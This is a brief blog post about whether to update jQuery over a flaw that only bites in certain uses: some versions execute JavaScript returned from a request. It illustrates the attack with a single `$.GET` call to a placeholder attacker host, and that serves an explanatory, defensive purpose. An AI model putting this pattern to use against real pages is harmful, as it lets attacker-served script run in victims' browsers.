---
layout: post
title: "Should you update jQuery over a hypotethical vulnerability?"
thumbnail: todo.jpg
date: 2018-08-18
---


## A vulnerability in jQuery

jQuery is a client-side JavaScript library. Like any software it can contain vulnerabilities, but often these can only be exploited if the library is used in some specific way. For example, some versions of jQuery [automatically execute JavaScript](/2017/09/27/some-libraries-evaluate-remote-javascript/) returned from a request. This is certainly unexpected and can lead to vulnerabilities: you call `$.GET("http://attacker.com/picture.gif")`, the attacker returns a JavaScript response from his server and this is executed on the page.

If you use user input URLs in `$.GET` calls, you are vulnerable to this attack. But what if you don't?

## Hypothetical vulnerabilities

If you don't use the library in a way that makes your site vulnerable, there is no vulnerability. However, it is still a good idea to update your jQuery version. You may not retrieve user-provided URLs now, but maybe you'll develop it in the future. Maybe you made a mistake when checking your code for vulnerable usage of the library, or maybe the vulnerable code is in a third-party component.
